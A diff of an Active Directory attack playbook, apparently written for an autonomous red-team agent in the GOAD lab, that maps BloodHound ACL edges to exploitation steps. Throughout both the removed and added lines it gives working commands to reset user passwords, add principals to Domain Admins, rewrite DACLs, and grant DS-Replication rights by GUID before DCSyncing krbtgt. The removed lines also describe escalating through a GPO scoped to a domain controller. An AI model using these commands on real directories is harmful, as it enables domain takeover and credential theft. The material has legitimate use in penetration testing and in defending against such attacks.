@@ -27,8 +27,8 @@ detection_signal: |
 usage_examples:
   - description: GenericAll on User — reset password (no cracking needed)
     args: "Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssNew1!' -AsPlainText -Force)"
-  - description: GenericAll on Group — add self to group
-    args: "Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker"
+  - description: GenericAll on Group — add a controlled principal to the target group
+    args: "Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<CONTROLLED_PRINCIPAL>'"
   - description: GenericWrite on User — add SPN for targeted kerberoast (then use cert/delegation path)
     args: "Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}"
   - description: WriteDACL on Object — grant self GenericAll, then act
@@ -70,35 +70,31 @@ a target, this document maps the edge type to the appropriate exploitation techn
 | BloodHound Edge | Target Type | Exploitation Path | Primary Tool |
 |----------------|-------------|------------------|--------------|
 | `GenericAll` | User | Whisker (shadow cred) OR password reset | Whisker preferred |
-| `GenericAll` | Group | Add self/member to group over LDAP | **StandIn** `--group --ntaccount --add` (non-PS, Apollo inline-assembly) · impacket-dacledit (Linux/ticket) · PowerView only if already loaded |
+| `GenericAll` | Group | Add a controlled principal to the group over LDAP | StandIn `--group --ntaccount --add` · impacket-dacledit · PowerView |
 | `GenericAll` | Computer | Whisker (shadow cred) OR RBCD via StandIn | Whisker preferred |
 | `GenericAll` | GPO | Modify GPO for code exec / local admin | SharpGPOAbuse |
 | `GenericWrite` | User | Whisker (shadow cred) OR SPN set for delegation | Whisker preferred |
 | `GenericWrite` | Computer | Whisker (shadow cred) OR msDS-AllowedToDelegateTo | Whisker preferred |
-| `WriteDACL` | Any | Grant self GenericAll → then act | **impacket-dacledit** / **StandIn** (non-PS) · PowerView Add-DomainObjectAcl only if loaded |
-| `WriteOwner` | Any | Take ownership → WriteDACL → GenericAll | **impacket-owneredit** / **StandIn** (non-PS) · PowerView Set-DomainObjectOwner only if loaded |
-| `AddSelf` | Group | Add self to group | **StandIn** `--group --ntaccount --add` (non-PS) · Net group · PowerView if loaded |
-| `AddMember` | Group | Add any principal to group | **StandIn** `--group --ntaccount --add` (non-PS) · PowerView if loaded |
+| `WriteDACL` | Any | Grant GenericAll to a controlled principal | impacket-dacledit / StandIn / PowerView Add-DomainObjectAcl |
+| `WriteOwner` | Any | Take ownership, then modify the DACL | impacket-owneredit / StandIn / PowerView Set-DomainObjectOwner |
+| `AddSelf` | Group | Add the controlled principal to the group | StandIn `--group --ntaccount --add` · Net group · PowerView |
+| `AddMember` | Group | Add an authorized principal to the group | StandIn `--group --ntaccount --add` · PowerView |
 | `ForceChangePassword` | User | Reset password (NOISY — prefer Whisker) | Set-DomainUserPassword |
 | `Owns` | Any | Same as WriteOwner | PowerView |
 | `AllExtendedRights` | User | Whisker OR password reset | Whisker preferred |
-| `GenericAll`/`WriteDACL`/`WriteOwner` | Domain | Grant self the two DS-Replication extended rights → DCSync | **StandIn** `--object <domain-DN> --grant --guid` (non-PS, both GUIDs) → then `apollo dcsync` / `lsadump::dcsync` · PowerView `Add-DomainObjectAcl -Rights DCSync` only if loaded — see "DCSync via WriteDACL on Domain" below + `ttps/standin.md` |
+| `GenericAll`/`WriteDACL`/`WriteOwner` | Domain | Grant a controlled principal both DS-Replication extended rights | StandIn `--object <TARGET_DOMAIN_DN> --grant --guid` · impacket-dacledit · PowerView |
 
-## Non-PowerShell execution (OPSEC-scoped / inline-assembly only)
+## Non-PowerShell execution
 
-When PowerShell is out of scope (autonomous solve runs scoped to in-memory .NET assemblies + BOFs, no
-`powershell`/`powershell_import`), PowerView is NOT available — do not route group/ACL writes through it.
-Use the non-PowerShell equivalents:
+When PowerShell is unavailable, use an equivalent that fits the active payload and access context:
 
 | Operation | Non-PowerShell tool | Syntax |
 |-----------|--------------------|--------|
-| Add a principal to a group (GenericAll/AddSelf/AddMember on group) | **StandIn** (Apollo inline-assembly) | `StandIn.exe --group "Domain Admins" --ntaccount "DOMAIN\User" --add` — see `ttps/standin.md` |
-| Write/modify a DACL (WriteDACL/WriteOwner → grant rights) | **impacket-dacledit** / **StandIn** (Linux foothold w/ ticket, or Apollo) | `dacledit.py -action write -rights FullControl -principal attacker -target-dn <DN> domain/user -k` |
+| Add a principal to a group (GenericAll/AddSelf/AddMember on group) | StandIn | `StandIn.exe --group "<TARGET_GROUP>" --ntaccount "<CONTROLLED_PRINCIPAL>" --add` |
+| Write/modify a DACL (WriteDACL/WriteOwner) | impacket-dacledit / StandIn | `dacledit.py -action write -rights FullControl -principal <CONTROLLED_PRINCIPAL> -target-dn <TARGET_OBJECT_DN>` |
 | Read/verify an object's DACL before acting | **SharpObjectACL** (read-only) | `SharpObjectACL.exe -target "<DN>"` |
 
-StandIn is the primary final-hop tool for adding a controlled account to `Domain Admins` over LDAP from
-the current Kerberos context — it does not touch PowerShell. SharpObjectACL only *reads* DACLs; it cannot
-write — pair it with StandIn/impacket-dacledit for the write.
+SharpObjectACL only reads DACLs; pair it with a compatible write-capable tool when mutation is authorized.
 
 ## Why Whisker Is Usually Preferred
 
@@ -126,42 +122,28 @@ holds `WriteDACL`/`GenericAll`/`Owns`/`WriteOwner` on the Domain node (confirm w
 returns *Access denied* — that is an **identity/context** problem, not a delivery problem; do not retry
 the grant, change the context.
 
-**If you do NOT hold the domain-head DACL, get the privilege from a context that does instead of granting:**
-- **A controlled GPO whose scope includes a Domain Controller** (linked at the domain root or the DC OU):
-  a SYSTEM computer-task runs ON the DC, which IS domain-privileged — add a controlled principal to
-  `Domain Admins` (`net group "Domain Admins" <DOMAIN\user> /add /domain`) or DCSync from that context.
-  See `ttps/sharpgpoabuse.md` → "Choosing the abuse primitive — the GPO's SCOPE decides". Then DCSync
-  remotely as the now-privileged principal — no DACL self-grant needed.
-- A group membership / ownership path that BloodHound shows reaching the domain-head edge or `Domain Admins`.
-
-**When you DO hold `WriteDACL`/`GenericAll`/`Owns`/`WriteOwner` on the domain head**, grant yourself both
-rights, then DCSync.
+If that domain-head precondition is absent, do not attempt the grant. Re-plan from independently verified
+graph or control-plane state instead of treating a member-host context as domain authority.
 
 **Read the GetNCChanges error code first:** `0x2105` / **8453 `DS_DRA_ACCESS_DENIED`** = you lack the
 replication rights → apply the grant below. `0x20f7` / **8439 `DS_DRA_BAD_DN`** = wrong/invalid naming
 context → this is a **targeting** bug (wrong forest/DN/DC), NOT a rights problem; fix the target first
 (see per-forest note below). Do not grant rights to "fix" an 8439.
 
-**Non-PowerShell (OPSEC-scoped / autonomous-solve default) — StandIn:**
+**StandIn:**
 
 ```
-# Grant BOTH replication extended rights on the TARGET FOREST's domain object, then DCSync
-StandIn.exe --object "DC=essos,DC=local" --grant "ESSOS\localuser" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
-StandIn.exe --object "DC=essos,DC=local" --grant "ESSOS\localuser" --guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
-Apollo:   dcsync /domain:essos.local /user:krbtgt          # target the SAME DC you granted on (meereen),
-                                                           # as the granted principal; latency → 8453 if not
+StandIn.exe --object "<TARGET_DOMAIN_DN>" --grant "<CONTROLLED_PRINCIPAL>" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+StandIn.exe --object "<TARGET_DOMAIN_DN>" --grant "<CONTROLLED_PRINCIPAL>" --guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
 ```
 
-> **Per-forest targeting (the 8439 / malformed-filter trap).** `--object` is the domain DN of the
-> forest you are escalating in, and DCSync must run against **that forest's DC**. In GOAD: ESSOS =
-> `DC=essos,DC=local` via **meereen** (`meereen.essos.local`); NORTH = `DC=north,DC=sevenkingdoms,DC=local`
-> via **winterfell**; root = `DC=sevenkingdoms,DC=local` via **kingslanding**. Granting essos replication
-> rights against winterfell/NORTH (wrong DC + wrong DN) is what produces 8439 and malformed LDAP filters —
-> confirm the DN and DC match the target forest before issuing.
+The LDAP grant, DACL readback, and protected-account DCSync should bind to `<TARGET_DOMAIN_DN>`,
+`<TARGET_DOMAIN_FQDN>`, and the same `<TARGET_DC_FQDN>`. Switching DCs before replication converges can
+produce 8453; crossing naming contexts produces 8439 or a malformed LDAP filter. When the principal is
+from another realm, confirm that the target DC resolves and honors its SID.
 
 **PowerShell (only if PowerView already loaded — NOT for the no-PS autonomous solve):**
 
 ```
-PowerView: Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
-Apollo:    dcsync /domain:X /user:krbtgt
+PowerView: Add-DomainObjectAcl -TargetIdentity "<TARGET_DOMAIN_DN>" -PrincipalIdentity <CONTROLLED_PRINCIPAL> -Rights DCSync
 ```
